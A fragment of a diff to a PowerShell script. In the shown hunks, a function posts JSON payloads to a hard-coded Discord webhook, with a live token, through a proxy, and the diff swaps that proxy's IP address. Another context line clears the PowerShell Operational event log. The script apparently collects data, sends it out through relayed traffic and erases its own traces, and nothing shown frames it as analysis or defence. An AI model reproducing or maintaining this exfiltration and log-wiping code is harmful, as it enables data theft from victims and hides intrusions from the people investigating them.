@@ -32,7 +32,7 @@ function Send-Webhook-Data {
     param($Payload)
 
     $webhookUrl = "https://discord.com/api/webhooks/1430163604883243069/o8pNeSj-qVF5ROqFNqoac6kK3BsVgC7RvLU2KvczeNZfS03108GQM5kapCV4OE2YukRm"
-    $proxy = "http://176.65.132.67:3128" 
+    $proxy = "http://20.27.15.111:8561"
 
     $body = $Payload | ConvertTo-Json -Depth 5
 
@@ -569,6 +569,7 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
 
 
